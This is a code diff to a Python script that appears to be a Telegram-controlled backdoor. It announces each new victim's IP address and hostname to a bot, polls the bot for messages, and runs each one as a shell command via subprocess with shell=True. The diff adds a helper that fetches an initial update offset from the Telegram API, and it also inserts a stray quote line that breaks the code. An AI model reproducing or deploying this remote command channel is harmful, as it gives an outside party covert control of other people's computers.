@@ -5,6 +5,7 @@ import requests
 
 telegram_token = 'your telegram token'
 chat_id='your chat id'
+'
 
 def cmd(command):
     p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -21,10 +22,18 @@ def read_messages(offset):
     return offset, message
 
 
+def getFirstoffset(telegram_token):
+    r = requests.get('https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset=678189729')
+    t = str(r.json()).split("{'update_id':")[-1]
+    t = t.split()
+    t = t[0].replace(',','')
+    return t
+
+
 def start():
     send_messages('New connection,'+socket.gethostbyname(socket.gethostname())+' '+socket.gethostname())
     ffo=1
-    off=0
+    off=getFirstoffset(telegram_token)
     count=0
     while True:
         try:
@@ -41,3 +50,5 @@ def start():
         
 if __name__=='__main__':
     start()
+    
+    
